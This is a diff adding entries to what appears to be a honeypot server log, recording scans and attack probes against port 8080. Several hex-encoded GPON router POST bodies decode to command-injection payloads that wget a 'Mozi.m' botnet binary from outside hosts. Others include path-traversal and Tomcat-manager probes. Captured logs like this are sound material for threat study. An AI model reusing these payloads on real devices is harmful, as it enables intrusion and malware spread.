@@ -2715,3 +2715,65 @@ Sun Sep 12 2021 23:31:29 GMT+0800 (HKT) HTTP ::ffff:205.185.117.127:39040 GET ht
 
 Sun Sep 12 2021 23:58:03 GMT+0800 (HKT) HTTP ::ffff:18.169.170.209:21345 GET / ["User-Agent","masscan/1.3 (https://github.com/robertdavidgraham/masscan)","Accept","*/*"]
 
+Mon Sep 13 2021 00:24:56 GMT+0800 (HKT) HTTP ::ffff:18.169.170.209:47392 GET / ["Host","172.104.76.143:8080","User-Agent","'Cloud mapping experiment. Contact research@pdrlabs.net'","Accept","*/*","Accept-Encoding","gzip"]
+
+Mon Sep 13 2021 00:44:30 GMT+0800 (HKT) HTTP ::ffff:198.98.56.34:58668 GET /manager/html ["Host","","Connection","close","User_Agent","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"]
+
+Mon Sep 13 2021 01:11:17 GMT+0800 (HKT) HTTP ::ffff:172.105.189.111:40158 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 ","Accept","*/*","Accept-Encoding","gzip"]
+
+Mon Sep 13 2021 03:43:31 GMT+0800 (HKT) HTTP ::ffff:176.212.181.121:57212 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36","Content-Length","0"]
+
+Mon Sep 13 2021 05:05:15 GMT+0800 (HKT) HTTP ::ffff:194.8.156.27:50161 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7","Content-Length","0"]
+
+Mon Sep 13 2021 05:38:48 GMT+0800 (HKT) HTTP ::ffff:91.132.58.162:54016 GET ///remote/fgt_lang?lang=/../../../..//////////dev/ ["Host","172.104.76.143:8080","Connection","keep-alive","Accept-Encoding","gzip, deflate","Accept","*/*","User-Agent","python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1160.41.1.el7.x86_64"]
+
+Mon Sep 13 2021 06:04:45 GMT+0800 (HKT) HTTP ::ffff:192.241.217.239:49930 GET /manager/text/list ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 zgrab/0.x","Accept","*/*","Accept-Encoding","gzip"]
+
+Mon Sep 13 2021 06:45:23 GMT+0800 (HKT) HTTP ::ffff:186.33.114.215:52031 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7","Content-Length","0"]
+
+Mon Sep 13 2021 07:07:09 GMT+0800 (HKT) HTTP ::ffff:143.198.237.81:48226 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 zgrab/0.x","Accept","*/*","Accept-Encoding","gzip"]
+
+Mon Sep 13 2021 07:35:37 GMT+0800 (HKT) HTTP ::ffff:193.77.65.149:46905 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36","Content-Length","0"]
+
+Mon Sep 13 2021 07:35:49 GMT+0800 (HKT) HTTP ::ffff:46.174.191.30:38364 GET / ["User-Agent","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30","Accept","*/*"]
+
+Mon Sep 13 2021 10:32:45 GMT+0800 (HKT) HTTP ::ffff:37.26.133.14:38810 GET http://hideface.mooo.com/hellod?rnd=b2590c3345bbd6fcafa937dc5aa567ba&rn=926988522 ["Host","hideface.mooo.com","User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0","Accept","*/*","Accept-Encoding","gzip","Proxy-Connection","Keep-Alive"]
+
+Mon Sep 13 2021 11:36:31 GMT+0800 (HKT) HTTP ::ffff:103.161.152.222:39273 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36","Content-Length","0"]
+
+Mon Sep 13 2021 11:58:08 GMT+0800 (HKT) HTTP undefined:undefined POST /GponForm/diag_Form?images/ ["Host","127.0.0.1:8080","Connection","keep-alive","Accept-Encoding","gzip, deflate","Accept","*/*","User-Agent","Hello, World","Content-Length","118"]
+58576562506167654e616d653d6469616726646961675f616374696f6e3d70696e672677616e5f636f6e6c6973743d3026646573745f686f73743d60603b776765742b687474703a2f2f3131342e33332e39342e33353a35373731372f4d6f7a692e6d2b2d4f2b2d3e2f746d702f67706f6e38303830
+Mon Sep 13 2021 12:15:29 GMT+0800 (HKT) HTTP ::ffff:192.241.220.228:33832 GET /manager/html ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 zgrab/0.x","Accept","*/*","Accept-Encoding","gzip"]
+
+Mon Sep 13 2021 12:44:46 GMT+0800 (HKT) HTTP ::ffff:192.241.221.189:34346 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 zgrab/0.x","Accept","*/*","Accept-Encoding","gzip"]
+
+Mon Sep 13 2021 14:33:42 GMT+0800 (HKT) TCP new client ::ffff:89.248.165.24:60936
+Mon Sep 13 2021 14:33:42 GMT+0800 (HKT) TCP ::ffff:89.248.165.24:60936 client data str   /*�     Cookie: mstshash=Administr
+     
+Mon Sep 13 2021 14:33:42 GMT+0800 (HKT) TCP ::ffff:89.248.165.24:60936 client data buf 0300002f2ae00000000000436f6f6b69653a206d737473686173683d41646d696e697374720d0a0100080003000000
+Mon Sep 13 2021 14:38:17 GMT+0800 (HKT) HTTP undefined:undefined POST /GponForm/diag_Form?images/ ["Host","127.0.0.1:8080","Connection","keep-alive","Accept-Encoding","gzip, deflate","Accept","*/*","User-Agent","Hello, World","Content-Length","118"]
+58576562506167654e616d653d6469616726646961675f616374696f6e3d70696e672677616e5f636f6e6c6973743d3026646573745f686f73743d60603b776765742b687474703a2f2f3139322e3136382e312e313a383038382f4d6f7a692e6d2b2d4f2b2d3e2f746d702f67706f6e383038303b73
+events.js:183
+      throw er; // Unhandled 'error' event
+      ^
+
+Error: read ECONNRESET
+    at _errnoException (util.js:992:11)
+    at TCP.onread (net.js:618:25)
+worker 15072 died
+Worker 23133 started
+tcp server listening { port: 8124, family: 'IPv6', address: '::' }
+http listening :::8080
+udp listening 0.0.0.0:41234
+Mon Sep 13 2021 16:05:11 GMT+0800 (HKT) HTTP ::ffff:200.122.211.138:56078 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36","Content-Length","0"]
+
+Mon Sep 13 2021 16:36:25 GMT+0800 (HKT) HTTP ::ffff:128.14.134.134:44416 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 ","Accept","*/*","Accept-Encoding","gzip"]
+
+Mon Sep 13 2021 18:29:48 GMT+0800 (HKT) HTTP ::ffff:178.128.194.144:55676 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/70.0","Accept","*/*","Accept-Encoding","gzip"]
+
+Mon Sep 13 2021 19:26:27 GMT+0800 (HKT) HTTP ::ffff:36.72.212.30:22029 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36","Content-Length","0"]
+
+Mon Sep 13 2021 19:33:52 GMT+0800 (HKT) HTTP undefined:undefined POST /GponForm/diag_Form?images/ ["Host","127.0.0.1:8080","Connection","keep-alive","Accept-Encoding","gzip, deflate","Accept","*/*","User-Agent","Hello, World","Content-Length","118"]
+58576562506167654e616d653d6469616726646961675f616374696f6e3d70696e672677616e5f636f6e6c6973743d3026646573745f686f73743d60603b776765742b687474703a2f2f3131342e3133342e32342e3232303a34323831322f4d6f7a692e6d2b2d4f2b2d3e2f746d702f67706f6e3830
+Mon Sep 13 2021 22:52:07 GMT+0800 (HKT) HTTP ::ffff:162.142.125.195:44482 GET / ["Host","172.104.76.143:8080","User-Agent","Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)","Accept","*/*","Accept-Encoding","gzip"]
+
